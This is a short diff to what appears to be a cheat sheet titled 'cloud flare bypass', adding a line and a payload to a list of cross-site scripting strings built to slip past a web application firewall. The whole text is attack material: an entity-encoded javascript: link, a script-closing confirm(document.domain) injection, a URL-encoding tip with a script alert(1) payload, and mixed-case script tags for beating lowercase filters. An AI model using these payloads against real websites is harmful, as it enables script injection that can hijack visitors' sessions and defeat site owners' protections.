@@ -5,6 +5,9 @@ cloud flare bypass
 #"></div><a href= javascript&colon;alert&lpar;document&period;domain)
 ```23%27);}</script><script>confirm(document.domain)</script>//```
 
+bypass the firewall by URL encoding the payload
+}}iybkg<script>alert(1)</script>//iipue=1
+
 1. Check if WAF is blocking only lowercase
 <sCRipT>alert(1)</sCRiPt>
  
